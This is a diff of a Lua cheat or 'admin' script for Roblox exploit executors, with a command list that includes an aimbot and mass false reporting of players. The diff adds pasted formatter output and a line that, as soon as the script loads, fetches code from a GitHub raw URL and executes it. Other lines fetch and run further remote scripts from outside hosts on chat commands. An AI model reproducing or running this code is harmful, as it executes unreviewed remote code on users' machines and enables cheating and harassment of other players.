@@ -1,3 +1,22 @@
+Pretty print
+Your script will not throw syntax errors, but there are some warnings!
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-
 --MADE BY Roblox: Urm8m (Alikhammas) Discord: urmoml0l--
 --------------------AK ADMIN PREMIUM VERSION--------------
 -- /cmds
@@ -34,7 +53,7 @@
 -- /autoreport-- reports all players in the server for exploiting--
 -- /aimbot--
 -- /chaoshub-- only works in chaos
-
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/boomboxtoggle'))()
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/toggle " then loadstring(game:HttpGet('https://raw.githubusercontent.com/Alikhammass/MyAdmin/main/boomboxtoggle'))() end end)
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/sirius" then loadstring(game:HttpGet('https://sirius.menu/script'))() end end)
 game:GetService("Players").LocalPlayer.Chatted:connect(function(msg) if string.lower(msg) == "/chaoshub" then loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/AstralHub/main/Loader.lua"))() end end)
